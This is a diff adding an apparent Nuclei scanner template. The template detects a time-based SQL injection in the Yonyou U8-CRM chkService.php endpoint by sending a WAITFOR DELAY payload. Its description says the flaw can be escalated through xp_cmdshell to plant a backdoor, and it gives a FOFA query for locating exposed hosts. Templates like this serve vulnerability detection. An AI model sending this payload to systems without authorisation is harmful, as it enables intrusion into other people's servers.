@@ -1,0 +1,39 @@
+id: yonyou-crm-chkservice-sqli
+
+info:
+  name: 用友U8-CRM系统chkService.php存在SQL注入漏洞
+  author: qwtd
+  severity: high
+  description: 用友U8-CRM系统 /ajax/chkService.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
+  metadata:
+    fofa-query: app="用友U8CRM"
+  tags: 用友-U8-CRM
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        GET /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration>=5"
+      - type: word
+        words:
+          - '"success":'
+          - '"message":'
+          - '"code"'
+        condition: and
